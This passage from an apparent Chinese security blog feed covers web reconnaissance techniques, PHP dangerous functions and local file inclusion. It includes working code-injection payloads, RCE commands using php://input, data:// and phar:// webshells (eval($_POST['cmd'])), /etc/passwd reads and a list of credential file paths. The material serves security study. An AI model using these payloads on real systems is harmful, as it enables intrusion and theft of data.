title="DNS信息"></a>DNS信息</h2><p>DNS用来获取网站IP，但若网站使用了CDN服务则无效。</p><ul><li><code>dig anemone.top</code> # Linux</li><li><code>dig @1.1.1.1 anemone.top</code> # 使用1.1.1.1dns解析</li><li><code>nslookup anemone.top</code> # Windows</li></ul><h2 id="指纹信息"><a href="#指纹信息" class="headerlink" title="指纹信息"></a>指纹信息</h2><p>获取中间件类型和版本，通过http头部获取，也可以用whatweb工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb anemone.top</span><br></pre></td></tr></table></figure><p>根据目录、头文件、特有文件等识别CMS：</p><ul><li><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></li><li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li><li><a href="https://www.test404.com/post-1618.html" target="_blank" rel="noopener">Test404轻量CMS指纹识别</a> </li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li></ul><h1 id="服务器的相关信息"><a href="#服务器的相关信息" class="headerlink" title="服务器的相关信息"></a>服务器的相关信息</h1><h2 id="寻找真实IP"><a href="#寻找真实IP" class="headerlink" title="寻找真实IP"></a>寻找真实IP</h2><p>先用多地ping判断网站是否存在CDN：</p><ul><li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li></ul><p>若存在CDN则尝试如下办法寻找真实IP：</p><ul><li>分站域名</li><li><p>DNS历史记录</p><ul><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li></ul><ul><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li></ul></li><li><p>上传附件</p></li><li><p>国外DNS：利用国内网站不在国外做CDN的特点，使用国外的DNS解析，感谢”<a href="https://www.freebuf.com/articles/web/179043.html" target="_blank" rel="noopener">经验分享｜谈谈渗透测试中的信息搜集</a>“提供了以下冷门的DNS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">209.244.0.3</span><br><span class="line">64.6.64.6</span><br><span class="line">8.8.8.8</span><br><span class="line">9.9.9.9</span><br><span class="line">8.26.56.26</span><br><span class="line">199.85.126.10</span><br><span class="line">208.67.222.222</span><br><span class="line">195.46.39.39</span><br><span class="line">69.195.152.204</span><br><span class="line">208.76.50.50</span><br><span class="line">216.146.35.35</span><br><span class="line">37.235.1.174</span><br><span class="line">198.101.242.72</span><br><span class="line">77.88.8.8</span><br><span class="line">91.239.100.100</span><br><span class="line">74.82.42.42</span><br><span class="line">109.69.8.51</span><br><span class="line">156.154.70.1</span><br><span class="line">1.1.1.1</span><br><span class="line">45.77.165.194</span><br></pre></td></tr></table></figure></li><li><p>邮箱：邮件服务器无法CDN，因此可以使用网站的邮件发送功能（如密码找回等）获取原IP，当然要确保网站的邮件服务器用的是自己的。</p></li><li><p>全网扫描：最笨的办法是使用工具扫描全网的IP段：</p><ul><li>zmap，<a href="https://github.com/zmap/zgrab" target="_blank" rel="noopener">zgrab</a>(<a href="https://www.t00ls.net/articles-40631.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-40631.html</a>)</li><li>fuckcdn.exe</li><li>w8Fuckcdn</li></ul></li><li><p>网站漏洞，如：</p><ul><li>SSRF</li><li>phpinfo</li></ul></li></ul><h2 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h2><ul><li>网址大小写是否敏感判断Windows/Linux</li><li>nmap识别系统</li></ul><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sT -p- -sV 127.0.0.1</span><br></pre></td></tr></table></figure><p>常用端口有：</p><p>3306 mysql<br>1433 mssql<br>1521 oracle<br>5432 postgresql<br>6379 redis<br>27017 mongodb<br>8080 tomcat/resin/jetty<br>137 samba<br>873 rsync<br>5900 vnc</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>从HTTP头部获取WAF信息</p><ul><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></li><li><code>wafw00f -a 域名</code></li></ul><h1 id="子域名、C段、旁站"><a href="#子域名、C段、旁站" class="headerlink" title="子域名、C段、旁站"></a>子域名、C段、旁站</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>暴力枚举<ul><li>(dnsrecon)[<a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a>]</li><li>subDomainsBrute</li><li>layer子域名挖掘机</li></ul></li><li>搜索引擎<ul><li>site: anemone.top</li><li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li><li>Sublist3r（集合多家搜索引擎结果）</li></ul></li><li>使用SSL/TLS证书查询<ul><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ul></li></ul><h2 id="C站查询"><a href="#C站查询" class="headerlink" title="C站查询"></a>C站查询</h2><ul><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a></li><li><code>nmap -p 80,8080 --open ip/24</code></li></ul><h2 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h2><ul><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li></ul><h1 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h1><p>可能泄露的目录有：</p><ul><li>网站后台</li><li>网站源代码备份，如:<ul><li>www.rar</li><li>www.zip</li></ul></li><li>版本控制<ul><li>/.git/config （利用：<a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">GitTools</a>，<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker</a>）</li><li>/.svn/entries （利用：Seay SVN漏洞利用工具）</li></ul></li><li>JavaWeb目录<ul><li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>/WEB-INF/classes/：含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中</li><li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li><li>/WEB-INF/database.properties：数据库配置文件</li></ul></li><li>其他敏感文件泄露，如：<ul><li>phpinfo</li><li>robots.txt</li><li>.DS_Store(<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a>)</li></ul></li></ul><p>推荐工具有：</p><ul><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></li><li>御剑，<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a></li></ul><h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><ul><li>GitHub源码<ul><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li></ul></li><li>网络资产搜索引擎：<ul><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li></ul></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>信息收集总结，<a href="https://blog.csdn.net/qq_33336310/article/details/86665344" target="_blank" rel="noopener">https://blog.csdn.net/qq_33336310/article/details/86665344</a></li><li>Web安全 — 信息收集<a href="https://www.freebuf.com/column/155795.html" target="_blank" rel="noopener">https://www.freebuf.com/column/155795.html</a></li><li>他山之石 | 渗透测试中的各种子域名枚举技术介绍，<a href="https://www.freebuf.com/articles/web/154809.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/154809.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。&lt;/p&gt;
&lt;h1 id=&quot;网站信息&quot;&gt;&lt;a href=&quot;#网站信息&quot; class=&quot;headerlink&quot; title=&quot;网站信息&quot;&gt;&lt;/a&gt;网站信息&lt;/h1&gt;&lt;h2 id=&quot;whois信息&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="信息收集" scheme="http://anemone.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息收集" scheme="http://anemone.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="waf探测" scheme="http://anemone.top/tags/waf%E6%8E%A2%E6%B5%8B/"/>
    
      <category term="cdn绕过" scheme="http://anemone.top/tags/cdn%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的危险函数和伪协议</title>
    <link href="http://anemone.top/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://anemone.top/php-PHP中的危险函数和伪协议/</id>
    <published>2019-02-07T07:02:13.000Z</published>
    <updated>2019-09-22T10:14:18.686Z</updated>
    
    <content type="html"><![CDATA[<p>复习一下PHP中常见的危险函数：</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><ul><li><p>file_get_contents()，该函数可以读取其他协议造成SSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$src=$_GET[<span class="string">'src'</span>];</span><br><span class="line">$homepage = file_get_contents($src);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br></pre></td></tr></table></figure></li><li><p>highlight_file()，高亮显示文件内容</p></li><li>show_source()，highlight_file()的别名</li><li>fopen()、fread()，fgets()、fgetss()、fpassthru()等<ul><li>fread(fopen($filename,”r”), $size); //读取<code>$size</code>长度的文件</li><li>fgets(fopen($filename, “r”)); //读取一行</li><li>fgetss(fopen($filename, “r”)); //读取一行并过滤HTML标记</li><li>fpassthru(fopen($filename, “r”)); //读取到文件结束</li></ul></li><li><p>readfile()，读取文件并返回至页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($file)) &#123;</span><br><span class="line">    header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">    header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment;   filename="'</span>.basename($file).<span class="string">'"'</span>);</span><br><span class="line">    header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">    header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">    header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">    readfile($file);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>file()，把文件读进数组中</p></li><li>php_strip_whitespace()，读取一个php文件并返回一个去掉注释和换行的文本，有意思的是，该函数可以去掉任意语言的注释，只要这个语言的注释风格与php相同并且在文件头加入<code>&lt;?php</code>就行可：<br><img src="/php-PHP中的危险函数和伪协议/1549526799636.png" alt="1549526799636"></li><li>parse_ini_file()，只能读取ini文件</li></ul><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul><li>system()</li><li>shell_exec()，和<code>system()</code>差不多</li><li>passthru()，返回二进制的输出</li><li>exec(‘ls’, $array)，返回结果保存在<code>array</code>中</li><li>pcntl_exec()，不返回结果</li><li><p>popen()，返回一个文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</span><br><span class="line">var_dump(fpassthru($handle));</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure></li><li><p>proc_open()，增强型<code>popen()</code>，允许有三个通道（输入，输出，错误）</p></li><li>&#96;(反单引号)</li><li>escapeshellcmd() // 该函数用于过滤字符保证不执行其他恶意指令</li></ul><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul><li>eval(“phpinfo();”)</li><li><p>assert()，原用法是assert失败后，调用回调函数，它会将参数作为代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line">assert(<span class="string">"is_int($num)"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>num=1)%20and%20phpinfo();//</code>，注意若前面的条件不满足则用or，如<code>a)%20or%20phpinfo();//</code></p></li><li><p>preg_replace + ‘/e’,/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>,$_GET[<span class="string">"cmd"</span>],<span class="string">"just test"</span>);</span><br></pre></td></tr></table></figure><p>payload为<code>cmd=phpinfo()</code>，注意该方法只在php 5.5.0以下版本有效。</p></li><li><p>create_function($args, ​$code)，创建一个匿名函数，由于内部是eval实现的，所以存在安全性问题，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sort_by = $_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'1234'</span>,<span class="string">'4321'</span>);</span><br><span class="line">$sort_function = <span class="string">'return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]);'</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br><span class="line">print_r($databases);</span><br></pre></td></tr></table></figure><p>构造payload的关键在于将create_function还原为eval实现的普通函数，接着按上下文闭合先前的函数逻辑（这里为strcmp）再加上其他语句<code>;}phpinfo();/*</code>，总之确保eval中的字符串拼接成一个php符合语法的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">    <span class="string">'function lambda($a, $b)&#123;</span></span><br><span class="line"><span class="string">        return strcmp($a["'</span>.$sort_by.<span class="string">'"], $b["'</span>.$sort_by.<span class="string">'"]); //replace with create_function</span></span><br><span class="line"><span class="string">    &#125;'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>由此payload为<code>sort_by=&quot;]);}phpinfo();/*</code>，此时eval中的字符串拼接成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span><span class="params">($a, $b)</span></span>&#123; </span><br><span class="line"><span class="keyword">return</span> strcmp($a[<span class="string">""</span>]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">/*"], $b[""]);&#125;phpinfo();/*"]); &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>call_user_func(callable $func, $arg)，调用func($arg)，若func可指定为assert则存在代码执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b=phpinfo()</code></p></li><li><p>call_user_func_array(callable $func , array $args_arr)，调用func，参数为数组<code>$args_arr</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func_array($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li><p>array_map(callable $func, array $array1 [, array $… ])，将array中的元素应用到$callback函数上，有点像Python的map</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">array_map($a, $b);</span><br></pre></td></tr></table></figure><p>payload为<code>a=assert&amp;b[]=phpinfo()</code></p></li><li>ob_start()，用法如下（只能显示一行）：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'system'</span>;ob_start($cmd);<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;ob_end_flush();</span><br></pre></td></tr></table></figure></li></ul><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul><li>move_uploaded_file()</li><li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li></ul><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li>require()，程序一运行就包含该文件</li><li>include()，执行到include时包含该文件</li><li>require_once()，include_once()：若已包含过则不再包含</li><li>allow_url_include = on，打开远程文件包含</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>extract()</li><li>import_request_variables()</li><li>parse_str()</li><li>mb_parse_str()<br>全局变量覆盖：register_globals为ON，$GLOBALS</li></ul><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><ul><li><p>php://filter，结合base64读取文件用，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=include.php|base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    45  100    45    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000</span><br><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php://input，将post作为输入，在<strong>远程文件包含</strong>和file_get_contents()时可以利用造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST http://localhost/include.php?file=php://input --data <span class="string">"&lt;?php system('ls -al');?&gt;"</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>data://，将data后的get请求作为输入，在<strong>远程文件包含</strong>时可造成RCE，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php system('ls -al');?&gt;"</span>|base64</span><br><span class="line">PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo=</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo="</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>zip://、compress.bzip2://、compress.zlib://，读取一个.zip/.bz2/.gz文件中的文件，可以将一句话压缩造成RCE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php echo system('ls -al');?&gt;"</span> &gt; ls.php</span><br><span class="line">$ zip -r shell.zip ls.php</span><br><span class="line">  adding: ls.php (stored 0%)</span><br><span class="line"><span class="comment"># 上传后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.zip/ls.php"</span></span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li><li><p>phar://，读取一个phar/zip文件，可以利用成RCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'shell.phar'</span>, 0);</span><br><span class="line"><span class="variable">$phar</span>[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php echo 12321; eval($_POST[\'</span>cmd\<span class="string">']);?&gt;'</span> ;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">$ php phar.php</span><br><span class="line"><span class="comment"># 上传phar后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.phar/shell.php"</span> --data <span class="string">"cmd=system('ls -al');"</span></span><br><span class="line">12321total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>php代码审计小总结，<a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</a></li><li>命令执行与代码执行的小结，<a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162128</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复习一下PHP中常见的危险函数：&lt;/p&gt;
&lt;h1 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;file_get_contents()，该函数可以读取其他
      
    
    </summary>
    
      <category term="PHP" scheme="http://anemone.top/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞利用</title>
    <link href="http://anemone.top/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8/"/>
    <id>http://anemone.top/php-文件包含利用/</id>
    <published>2019-02-07T07:02:13.000Z</published>
    <updated>2019-09-22T10:14:18.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>本地文件包含可以作为文件读取使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/include.php?file=/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可读如下敏感文件：</p><ul><li>Windows:<ul><li>C:\boot.ini    //查看系统版本</li><li>C:\Windows\System32\inetsrv\MetaBase.xml    //IIS配置文件</li><li>C:\Windows\repair\sam        //存储系统初次安装的密码</li><li>C:\Program Files\mysql\my.ini         //Mysql配置</li><li>C:\Program Files\mysql\data\mysql\user.MYD    //Mysql root</li><li>C:\Windows\php.ini    //php配置信息</li><li>C:\Windows\my.ini        